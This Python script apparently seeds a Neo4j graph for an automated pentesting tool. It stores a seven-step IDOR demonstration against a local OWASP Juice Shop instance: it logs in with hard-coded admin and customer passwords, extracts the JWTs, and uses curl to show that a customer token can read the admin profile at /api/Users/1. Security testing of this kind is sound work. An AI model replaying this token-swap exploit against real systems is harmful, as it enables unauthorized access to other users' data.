"""Seed a known-good ActionGraph for Juice Shop IDOR demo.

Usage: .venv/bin/python3 scripts/seed-demo-graph.py
"""

import json
import os
import uuid

from neo4j import GraphDatabase

# Connect
driver = GraphDatabase.driver(
    os.environ.get("NEO4J_URI", "neo4j://localhost:7687"),
    auth=(
        os.environ.get("NEO4J_USERNAME", "neo4j"),
        os.environ.get("NEO4J_PASSWORD", "password"),
    ),
)

FP_HASH = "b7501c4f1905a15e3562a38af60b84a5d0e0ad45b0e4270a703a8088c32a45b6"
AG_ID = str(uuid.uuid4())

# Steps that actually work against Juice Shop
steps = [
    {
        "order": 1,
        "phase": "CAPTURE",
        "type": "http_request",
        "command": "Login as admin",
        "parameters": json.dumps({
            "method": "POST",
            "url": "/rest/user/login",
            "headers": {"Content-Type": "application/json"},
            "body": '{"email":"admin@juice-sh.op","password":"admin123"}',
            "label": "Admin login",
        }),
        "output_file": "/tmp/admin_auth.json",
        "success_criteria": '"token"',
        "deterministic": True,
    },
    {
        "order": 2,
        "phase": "CAPTURE",
        "type": "http_request",
        "command": "Login as customer (jim)",
        "parameters": json.dumps({
            "method": "POST",
            "url": "/rest/user/login",
            "headers": {"Content-Type": "application/json"},
            "body": '{"email":"jim@juice-sh.op","password":"ncc-1701"}',
            "label": "Customer login",
        }),
        "output_file": "/tmp/customer_auth.json",
        "success_criteria": '"token"',
        "deterministic": True,
    },
    {
        "order": 3,
        "phase": "ANALYZE",
        "type": "shell_command",
        "command": "cat /tmp/admin_auth.json | grep -o '\"token\":\"[^\"]*' | head -1 | cut -d'\"' -f4 > /tmp/admin_token.txt && cat /tmp/admin_token.txt",
        "parameters": json.dumps({"label": "Extract admin JWT"}),
        "output_file": "/tmp/admin_token.txt",
        "success_criteria": "eyJ[A-Za-z0-9_-]+",
        "deterministic": True,
    },
    {
        "order": 4,
        "phase": "ANALYZE",
        "type": "shell_command",
        "command": "cat /tmp/customer_auth.json | grep -o '\"token\":\"[^\"]*' | head -1 | cut -d'\"' -f4 > /tmp/customer_token.txt && cat /tmp/customer_token.txt",
        "parameters": json.dumps({"label": "Extract customer JWT"}),
        "output_file": "/tmp/customer_token.txt",
        "success_criteria": "eyJ[A-Za-z0-9_-]+",
        "deterministic": True,
    },
    {
        "order": 5,
        "phase": "REPLAY",
        "type": "shell_command",
        "command": "ADMIN_TOKEN=$(cat /tmp/admin_token.txt) && curl -s -X GET 'http://localhost:3000/api/Users/1' -H \"Authorization: Bearer $ADMIN_TOKEN\" -H 'Accept: application/json'",
        "parameters": json.dumps({"label": "Admin accesses user 1 (own profile)"}),
        "output_file": None,
        "success_criteria": '"id":1',
        "deterministic": True,
    },
    {
        "order": 6,
        "phase": "REPLAY",
        "type": "shell_command",
        "command": "CUSTOMER_TOKEN=$(cat /tmp/customer_token.txt) && curl -s -X GET 'http://localhost:3000/api/Users/1' -H \"Authorization: Bearer $CUSTOMER_TOKEN\" -H 'Accept: application/json'",
        "parameters": json.dumps({"label": "Customer accesses admin profile (IDOR)"}),
        "output_file": None,
        "success_criteria": '"id":1',
        "deterministic": True,
    },
    {
        "order": 7,
        "phase": "OBSERVE",
        "type": "shell_command",
        "command": "echo 'IDOR CONFIRMED: Customer (jim) can access admin user profile at /api/Users/1 without authorization check'",
        "parameters": json.dumps({"label": "IDOR finding summary"}),
        "output_file": None,
        "success_criteria": "IDOR CONFIRMED",
        "deterministic": True,
    },
]


def seed(tx):
    # Create fingerprint
    tx.run(
        """
        MERGE (f:Fingerprint {hash: $hash})
        SET f.tech_stack = $tech_stack,
            f.auth_model = $auth_model,
            f.endpoint_pattern = $endpoint_pattern,
            f.security_signals = $security_signals
        """,
        hash=FP_HASH,
        tech_stack="Express",
        auth_model="JWT Bearer",
        endpoint_pattern="/api/*",
        security_signals=["clickjacking protected", "CORS permissive", "no CSP"],
    )

    # Create ActionGraph
    tx.run(
        """
        MATCH (f:Fingerprint {hash: $hash})
        CREATE (ag:ActionGraph {
            id: $ag_id,
            vulnerability_type: 'IDOR',
            description: 'IDOR test: customer accessing admin profile via /api/Users/1',
            confidence: 1.0,
            execution_count: 0,
            success_count: 0,
            created_at: datetime()
        })
        CREATE (f)-[:TRIGGERS]->(ag)
        """,
        hash=FP_HASH,
        ag_id=AG_ID,
    )

    # Create steps and chain
    for step in steps:
        params = {"ag_id": AG_ID}
        params.update(step)
        tx.run(
            """
            MATCH (ag:ActionGraph {id: $ag_id})
            CREATE (s:Step {
                order: $order,
                phase: $phase,
                type: $type,
                command: $command,
                parameters: $parameters,
                success_criteria: $success_criteria,
                deterministic: $deterministic
            })
            FOREACH (_ IN CASE WHEN $output_file IS NOT NULL THEN [1] ELSE [] END |
                SET s.output_file = $output_file
            )
            CREATE (ag)-[:HAS_STEP]->(s)
            """,
            params,
        )

    # Create STARTS_WITH to first step
    tx.run(
        """
        MATCH (ag:ActionGraph {id: $ag_id})-[:HAS_STEP]->(s:Step)
        WITH ag, s ORDER BY s.order LIMIT 1
        CREATE (ag)-[:STARTS_WITH]->(s)
        """,
        ag_id=AG_ID,
    )

    # Create NEXT chain
    tx.run(
        """
        MATCH (ag:ActionGraph {id: $ag_id})-[:HAS_STEP]->(s:Step)
        WITH s ORDER BY s.order
        WITH collect(s) AS steps
        UNWIND range(0, size(steps)-2) AS i
        WITH steps[i] AS s1, steps[i+1] AS s2
        CREATE (s1)-[:NEXT]->(s2)
        """,
        ag_id=AG_ID,
    )


with driver.session() as session:
    session.execute_write(seed)

print(f"Seeded ActionGraph {AG_ID} with {len(steps)} steps for fingerprint {FP_HASH[:16]}...")
driver.close()
